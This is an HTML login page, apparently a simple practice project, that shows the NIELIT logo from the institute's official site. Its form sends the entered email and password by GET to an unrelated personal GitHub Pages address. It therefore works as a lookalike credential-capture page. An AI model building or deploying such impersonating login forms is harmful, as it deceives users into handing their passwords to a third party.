<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Nielit Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background:rgb(224, 196, 221);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    
    .death {
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px black;
    }

    h2 {
      text-align: center;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid grey;
      border-radius: 4px;
    }

    input[type="submit"] {
      background-color: rgb(68, 235, 96);
      color: white;
      padding: 12px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      width: 100%;
    }

    input[type="submit"]:hover {
      background-color: brown;
    }

    .shadow {
      font-size: 12px;
      color: black;
    }
  </style>
</head>
<body>
  <div class="death">
    <img src="https://nielit.gov.in/images/NIELIT_logo.jpg" height="100px" width="200px">
    <h2>Sign In</h2>
    <form action="https://jen8974.github.io/jenthai89/" method="get">
      <label for="email">Email:</label>
      <input type="text" id="email" name="email" required pattern="[A-Za-z0-9]{3,}" title="At least 4 alphanumeric characters">

      <label for="password">Password:</label>
      <input type="password" id="password" name="password" required pattern=".{4,}" title="At least 4 characters">

      <input type="submit" value="Sign In">
    </form>
  </div>
</body>
</html>
